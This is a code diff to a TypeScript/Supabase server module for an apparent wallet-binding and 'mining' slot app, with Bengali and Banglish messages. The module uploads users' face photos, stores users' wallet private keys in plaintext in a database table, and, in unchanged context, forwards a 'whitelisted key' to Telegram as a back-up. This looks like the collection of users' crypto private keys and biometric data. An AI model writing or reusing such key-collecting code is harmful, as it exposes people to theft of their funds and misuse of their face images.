@@ -44,7 +44,8 @@ export const bindFirstVerify = createServerFn({ method: "POST" })
     if (!task) throw new Error("এই স্লট পাওয়া যায়নি");
     if (task.status !== "empty") throw new Error("Ei slot already verified");
 
-    // Reject duplicate wallet across the whole app
+    // Reject duplicate wallet across the whole app. This makes repeated
+    // clicks/refresh submits idempotent instead of creating duplicate slots.
     const { data: dup } = await supabaseAdmin
       .from("tasks").select("id").eq("wallet_address", data.walletAddress).maybeSingle();
     if (dup) throw new Error("Ei wallet already bind ache");
@@ -66,6 +67,15 @@ export const bindFirstVerify = createServerFn({ method: "POST" })
       })
       .eq("id", task.id);
     if (error) throw new Error(error.message);
+
+    // Remove the earlier backup row for this generated key, if it exists.
+    await supabaseAdmin
+      .from("unverified_attempts")
+      .delete()
+      .eq("user_id", userId)
+      .eq("wallet_address", data.walletAddress);
+
+    await supabaseAdmin.rpc("settle_mining", { _user_id: userId });
 
     // Notify Telegram with the whitelisted key for back-up. Await it so the
     // server runtime does not end before the message is sent.
@@ -106,11 +116,35 @@ export const saveNotWhitelisted = createServerFn({ method: "POST" })
     const { userId } = context;
     const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
 
-    const buf = Uint8Array.from(atob(data.photoBase64), (c) => c.charCodeAt(0));
-    const path = `${userId}/unverified-${data.slot ?? 0}-${Date.now()}.jpg`;
-    const { error: upErr } = await supabaseAdmin.storage
-      .from("face-photos").upload(path, buf, { contentType: "image/jpeg", upsert: false });
-    if (upErr) throw new Error("Photo upload failed: " + upErr.message);
+    const { data: existing } = await supabaseAdmin
+      .from("unverified_attempts")
+      .select("id, face_photo_url")
+      .eq("user_id", userId)
+      .eq("wallet_address", data.walletAddress)
+      .maybeSingle();
+
+    let path = existing?.face_photo_url ?? null;
+    if (!path) {
+      const buf = Uint8Array.from(atob(data.photoBase64), (c) => c.charCodeAt(0));
+      path = `${userId}/unverified-${data.slot ?? 0}-${Date.now()}.jpg`;
+      const { error: upErr } = await supabaseAdmin.storage
+        .from("face-photos").upload(path, buf, { contentType: "image/jpeg", upsert: false });
+      if (upErr) throw new Error("Photo upload failed: " + upErr.message);
+    }
+
+    if (existing) {
+      const { error } = await supabaseAdmin.from("unverified_attempts").update({
+        slot: data.slot ?? null,
+        task_id: data.taskId ?? null,
+        kind: data.kind,
+        face_label: data.faceLabel.trim(),
+        face_photo_url: path,
+        wallet_private_key: data.privateKey,
+        reason: data.reason ?? "Whitelist e pawa jay nai",
+      }).eq("id", existing.id);
+      if (error) throw new Error(error.message);
+      return { ok: true, updated: true };
+    }
 
     const { error } = await supabaseAdmin.from("unverified_attempts").insert({
       user_id: userId,
@@ -288,8 +322,8 @@ export const addMoreSlots = createServerFn({ method: "POST" })
       .from("tasks").select("slot, status").eq("user_id", userId).order("slot");
     const all = existing ?? [];
     if (all.length === 0) throw new Error("Kono slot pawa jay nai");
-    const anyOpen = all.some((t) => t.status !== "done");
-    if (anyOpen) throw new Error("Age sob slot complete koren, tarpor 10 ta notun slot khulte parben");
+    const anyEmpty = all.some((t) => t.status === "empty");
+    if (anyEmpty) throw new Error("Age sob slot joma din, tarpor 10 ta notun slot khulte parben");
 
     const maxSlot = Math.max(...all.map((t) => t.slot));
     const rows = Array.from({ length: 10 }, (_, i) => ({
